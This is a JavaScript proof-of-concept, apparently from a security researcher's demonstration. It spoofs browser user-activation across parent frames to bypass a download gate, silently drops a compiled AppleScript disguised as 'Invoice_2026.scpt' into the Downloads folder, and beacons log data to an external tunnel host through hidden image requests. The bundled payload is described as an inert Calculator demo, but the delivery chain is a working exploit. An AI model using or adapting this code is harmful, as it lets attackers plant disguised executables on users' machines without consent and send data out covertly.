/* T71-PART2 - SILENT SINGLE-FILE DROP, ZERO UI CHANGES (Pluto Security, inert canary).
   Second demonstration video: the shared link is opened, the playground app
   appears normally (its console shows the trace), and ONE file lands
   silently in ~/Downloads with zero interaction:
     "Invoice_2026.scpt" - a genuinely COMPILED AppleScript (T72-proven:
     quarantined .scpt opens in Script Editor with NO Gatekeeper prompt and
     executes arbitrary AppleScript after one Run press - inert Calculator
     demo). Clearly-labeled inert canary; nothing real. */
(function () {
  var SCPT_B64 = "RmFzZFVBUyAxLjEwMS4xMA4AAAAED///AAEAAgADAf//AAANAAEAAWsAAAAAAAAABAIABAACAAUABg0ABQADbAACAAAABQAH//7//Q0ABwADSQACAAAABf/8AAj/+wr//AAYLnN5c29leGVjVEVYVP//gAAAAAAAVEVYVA0ACAABbQAAAAAAAQAJDgAJAAGxAAoRAAoAJABvAHAAZQBuACAALQBhACAAQwBhAGwAYwB1AGwAYQB0AG8AcgL/+wAAAf/+AAAB//0AAAIABgACAAv/+g0ACwADbAACAAYAEQAM//n/+A0ADAADSQACAAYAEf/3AA0ADgr/9wAYLnN5c29kbG9nYXNrcgAAAAAAAAAAVEVYVA0ADQABbQAAAAYABwAPDgAPAAGxABARABAARgBUADcAMgAgAGMAYQBuAGEAcgB5ACAAKABpAG4AZQByAHQAKQAgAC0AIABQAGwAdQB0AG8AIABTAGUAYwB1AHIAaQB0AHkGAA4AA//2ABEAEgr/9gAECmJ0bnMNABEAAUoAAAAIAAsAEwIAEwACABT/9Q0AFAABbQAAAAgACQAVDgAVAAGxABYRABYABABPAEsC//UAAAYAEgAD//QAF//zCv/0AAQKZGZsdA0AFwABbQAAAAwADQAYDgAYAAGxABkRABkABABPAEsG//MAAAH/+QAAAf/4AAAC//oAAA4AAgAADxAAAwAD//IAGgAbAf/yAAAQABoAAf/xCv/xABguYWV2dG9hcHBudWxsAACAAAAAkAAqKioqDgAbAAcQ//AAHP/v/+4AHQAe/+0K//AAGC5hZXZ0b2FwcG51bGwAAIAAAACQACoqKioNABwAAWsAAAAAABEAHwIAHwACAAUAIAIAIAACAAv/7AL/7AAAAf/vAAAC/+4AABAAHQAAEAAeAAkACf/rAA//6gAV/+kAGP/o/+cK/+sAGC5zeXNvZXhlY1RFWFT//4AAAAAAAFRFWFQK/+oABApidG5zCv/pAAQKZGZsdAP/6AAECv/nABguc3lzb2Rsb2dhc2tyAAAAAAAAAABURVhUEf/tABLgagwAAU/i4+RrduXm5wwACA9hc2NyAAEADPre3q0=";
  var R = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
  var EPOCH = 1792678200;
  var FNAME = "Invoice_2026.scpt";

  /* invisible debug channel: every log line also beacons to the dashboard */
  function log(m) {
    try { console.log("[T71P2] " + m + " @" + Date.now()); } catch (e) {}
    try {
      var im = new Image();
      im.src = R + encodeURIComponent("LOG|T71P2|" + String(m).slice(0, 120)) + "-" + Date.now();
    } catch (e2) {}
  }
  log("PART2 single .scpt drop, epoch " + EPOCH);

  /* spoof userActivation on every same-origin window (T11-proven; the
     host download interceptor's gate reads the runner realm) */
  function spoofChain() {
    var w = window, n = 0;
    for (var i = 0; i < 6; i++) {
      try {
        Object.defineProperty(w.navigator, "userActivation", {
          get: function () { return { isActive: true, hasBeenActive: true }; },
          configurable: true
        });
        n++;
      } catch (e) {}
      try { var p = w.parent; if (!p || p === w) break; w = p; } catch (e) { break; }
    }
    return n;
  }

  function boot() {
    var d = document;
    log("boot (spoof " + spoofChain() + " windows)");

    /* the one silent write: the compiled AppleScript */
    try {
      var bin = atob(SCPT_B64);
      var bytes = new Uint8Array(bin.length);
      for (var k = 0; k < bin.length; k++) bytes[k] = bin.charCodeAt(k);
      var blob = new Blob([bytes], { type: "application/x-applescript" });
      var url = URL.createObjectURL(blob);
      var a = d.createElement("a");
      a.href = url;
      a.download = FNAME;
      a.style.display = "none";
      d.body.appendChild(a);
      a.click();
      setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 4000);
      log("WRITE FIRED: " + FNAME + " (compiled .scpt) - check ~/Downloads");
    } catch (e) { log("write ERR " + e.message); }
  }

  if (document.body) boot();
  else if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else { var iv = setInterval(function () { if (document.body) { clearInterval(iv); boot(); } }, 50); }
})();
